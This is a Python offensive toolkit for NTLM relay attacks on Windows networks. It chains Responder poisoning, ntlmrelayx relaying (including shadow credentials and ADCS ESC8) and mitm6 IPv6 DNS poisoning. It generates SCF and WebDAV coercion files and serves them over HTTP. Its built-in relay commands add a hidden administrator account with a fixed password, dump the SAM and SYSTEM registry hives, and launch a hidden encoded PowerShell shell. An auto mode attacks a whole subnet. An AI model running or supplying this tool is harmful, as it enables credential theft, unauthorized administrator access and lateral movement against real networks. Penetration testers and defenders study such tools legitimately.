#!/usr/bin/env python3

import os
import sys
import time
import json
import base64
import signal
import random
import string
import logging
import argparse
import netifaces
import http.server
from pathlib import Path
from threading import Thread
from datetime import datetime
from termcolor import colored
from subprocess import Popen, PIPE, STDOUT

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

class AttackConfig:
    """Configuration settings for different attack types"""
    
    def __init__(self):
        self.WEBDAV_TEMPLATE = """<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
<description>Microsoft Outlook</description>
<isSearchOnlyItem>false</isSearchOnlyItem>
<includeInStartMenuScope>true</includeInStartMenuScope>
<iconReference>imageres.dll,-1002</iconReference>
<templateInfo>
<folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
</templateInfo>
<simpleLocation>
<url>https://{server}/{path}</url>
</simpleLocation>
</searchConnectorDescription>
"""

        self.SCF_TEMPLATE = """[Shell]
Command=2
IconFile=\\\\{server}\\share\\icon.ico
[Taskbar]
Command=ToggleDesktop
"""

        self.DEFAULT_COMMANDS = {
            'add_user': 'net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add',
            'dump_sam': 'reg save HKLM\\SAM sam.save & reg save HKLM\\SYSTEM system.save',
            'shell': 'powershell.exe -NoP -sta -NonI -W Hidden -Enc {}'
        }

class RelayToolkit:
    def __init__(self, args):
        self.args = args
        self.config = AttackConfig()
        self.iface = args.interface or self.get_iface()
        self.local_ip = self.get_local_ip(self.iface)
        self.processes = []
        self.targets = []
        
    def get_iface(self):
        """Get default network interface"""
        try:
            return netifaces.gateways()['default'][netifaces.AF_INET][1]
        except:
            ifaces = []
            for iface in netifaces.interfaces():
                ipv4s = netifaces.ifaddresses(iface).get(netifaces.AF_INET, [])
                for entry in ipv4s:
                    addr = entry.get('addr')
                    if addr and not (iface.startswith('lo') or addr.startswith('127.')):
                        ifaces.append(iface)
            return ifaces[0]

    def get_local_ip(self, iface):
        """Get local IP address"""
        return netifaces.ifaddresses(iface)[netifaces.AF_INET][0]['addr']

    def edit_responder_conf(self, protocols_off=None):
        """Configure Responder settings"""
        if not protocols_off:
            protocols_off = ['HTTP', 'SMB']
            
        conf = Path('Responder/Responder.conf')
        if not conf.exists():
            self.print_bad("Responder.conf not found")
            sys.exit(1)
            
        content = conf.read_text()
        for proto in protocols_off:
            content = content.replace(f"{proto} = On", f"{proto} = Off")
        
        conf.write_text(content)
        self.print_good(f"Disabled protocols in Responder.conf: {', '.join(protocols_off)}")

    def run_command(self, cmd, shell=False):
        """Execute command and return process"""
        logger.debug(f"Running command: {cmd}")
        if shell:
            proc = Popen(cmd, shell=True, stdout=PIPE, stderr=PIPE)
        else:
            proc = Popen(cmd.split(), stdout=PIPE, stderr=PIPE)
        self.processes.append(proc)
        return proc

    def start_responder(self):
        """Start Responder with appropriate options"""
        cmd = f'responder -I {self.iface} -rdwv'
        if self.args.analyze:
            cmd += ' -A'
        return self.run_command(cmd)

    def start_ntlmrelay(self):
        """Configure and start ntlmrelayx"""
        options = [
            '-tf', self.args.target_file,
            '-smb2support',
            '-socks',
            '-debug'
        ]

        if self.args.shadow_credentials:
            options.append('--shadow-credentials')
        
        if self.args.adcs:
            options.extend(['-machine-account', 'ATTACK$', '-machine-password', 'AttackPass123'])
            
        if self.args.delegate_access:
            options.append('--delegate-access')
            
        if self.args.command:
            options.extend(['-c', self.args.command])
        elif self.args.auto:
            options.extend(['-c', self.config.DEFAULT_COMMANDS['add_user']])

        cmd = f'ntlmrelayx.py {" ".join(options)}'
        return self.run_command(cmd)

    def start_mitm6(self):
        """Start mitm6 for IPv6 DNS poisoning"""
        if not self.args.domain:
            self.print_bad("Domain required for mitm6")
            return None
            
        cmd = f'mitm6 -d {self.args.domain} -i {self.iface} --ignore-nofwd'
        return self.run_command(cmd)

    def setup_webdav(self):
        """Configure WebDAV attack"""
        webdav_xml = self.config.WEBDAV_TEMPLATE.format(
            server=self.local_ip,
            path='webdav'
        )
        Path('web/webdav.xml').write_text(webdav_xml)

    def generate_coerce_files(self):
        """Generate files for coercion attacks"""
        scf_file = self.config.SCF_TEMPLATE.format(server=self.local_ip)
        Path('web/@local.scf').write_text(scf_file)

    def start_http_server(self):
        """Start HTTP server for payloads"""
        if not self.args.no_http:
            from http.server import HTTPServer, SimpleHTTPRequestHandler
            httpd = HTTPServer(("", self.args.port), SimpleHTTPRequestHandler)
            server_thread = Thread(target=httpd.serve_forever)
            server_thread.daemon = True
            server_thread.start()
            self.print_good(f"Started HTTP server on port {self.args.port}")
            return httpd
        return None

    def cleanup(self):
        """Cleanup processes and temporary files"""
        for proc in self.processes:
            try:
                proc.terminate()
                proc.wait(timeout=2)
            except:
                proc.kill()

        cleanup_files = [
            'web/@local.scf',
            'web/webdav.xml',
            'targets.txt'
        ]
        
        for f in cleanup_files:
            try:
                Path(f).unlink()
            except:
                pass

    def print_bad(self, msg):
        print(colored('[-] ', 'red') + msg)

    def print_info(self, msg):
        print(colored('[*] ', 'blue') + msg)

    def print_good(self, msg):
        print(colored('[+] ', 'green') + msg)

    def auto_pwn(self):
        """Automated attack sequence"""
        # 1. Find relay targets
        self.print_info("Finding relay targets...")
        cmd = "netexec smb 10.10.10.0/24 --gen-relay-list targets.txt"
        self.run_command(cmd).wait()

        # 2. Set up attack infrastructure
        self.edit_responder_conf()
        self.setup_webdav()
        self.generate_coerce_files()
        httpd = self.start_http_server()

        try:
            # 3. Start core services
            responder = self.start_responder()
            ntlmrelay = self.start_ntlmrelay()
            
            # 4. Start additional attack vectors
            if not self.args.no_mitm6:
                mitm6 = self.start_mitm6()

            self.print_info("Attack running - Press Ctrl+C to stop")
            
            # Monitor outputs
            while True:
                time.sleep(1)
                
        except KeyboardInterrupt:
            self.print_info('\nStopping attack...')
        finally:
            self.cleanup()
            if httpd:
                httpd.shutdown()

def parse_args():
    parser = argparse.ArgumentParser(description="Modern NTLM Relay Toolkit")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("-t", "--target-file", help="File containing relay targets")
    parser.add_argument("-d", "--domain", help="Domain for mitm6 attack")
    parser.add_argument("-c", "--command", help="Command to execute on successful relay")
    parser.add_argument("-p", "--port", type=int, default=8080, help="HTTP server port (default: 8080)")
    
    # Attack vectors
    parser.add_argument("--no-mitm6", action="store_true", help="Disable mitm6 DNS poisoning")
    parser.add_argument("--no-http", action="store_true", help="Disable HTTP relay")
    parser.add_argument("--no-smb", action="store_true", help="Disable SMB relay")
    parser.add_argument("--adcs", action="store_true", help="Enable ADCS ESC8 attack")
    parser.add_argument("--shadow-credentials", action="store_true", help="Enable shadow credentials attack")
    parser.add_argument("--webdav", action="store_true", help="Enable WebDAV coercion")
    parser.add_argument("--delegate-access", action="store_true", help="Configure delegation access")
    
    # Modes
    parser.add_argument("--auto", action="store_true", help="Enable automated attack sequence")
    parser.add_argument("--analyze", action="store_true", help="Run Responder in analyze mode")
    
    return parser.parse_args()

def main():
    if os.geteuid():
        print(colored('[-] ', 'red') + 'Script must run as root')
        sys.exit(1)

    args = parse_args()
    toolkit = RelayToolkit(args)

    if args.auto:
        toolkit.auto_pwn()
    else:
        toolkit.print_info("Starting manual mode...")
        toolkit.auto_pwn()  # Use same flow but with manual options

if __name__ == "__main__":
    main()
